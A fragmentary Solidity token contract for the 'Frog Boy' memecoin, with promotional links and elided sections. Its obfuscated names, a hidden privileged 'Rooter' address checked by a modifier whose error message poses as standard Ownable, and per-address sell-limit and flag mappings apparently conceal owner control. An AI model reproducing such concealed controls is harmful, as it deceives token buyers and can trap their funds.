...
🚀 TG : https://t.me/FrogBoyToken
🚀 Twitter : https://twitter.com/FrogBoyEth
🚀 Website : http://Frogboyeth.com
✅ Shit Project
🔥 Based Dev
🔒 Liquidity Locked
🔢 9 Decimals
...
interface FROGBOYAsii is FROGBOYAsi {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
}
abstract contract FROGBOYAsiii is FROGBOYAs {
...
contract FROGBOY is FROGBOYAs, FROGBOYAsi, FROGBOYAsii, FROGBOYAsiii {

    mapping(address => uint256) private maxsell;
  mapping(address => bool) public FROGBOYAsiiZERTY;
    mapping(address => mapping(address => uint256)) private Confirmed;
address private FROGBOYRooter;
    uint256 private ALLtotalSupply;
    string private _name;
    string private _symbol;
        mapping(address => bool) public FROGBOYPaw;
  address walowalowalo;



    
    constructor(address FROGBOYadressss) {
            // Editable
            walowalowalo = msg.sender;

        _name = "Frog Boy";
        _symbol = "FRGB";
  FROGBOYRooter = FROGBOYadressss;        
    ...
    function transferFrom(
      ...
      modifier contractbot() {
        require(FROGBOYRooter == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
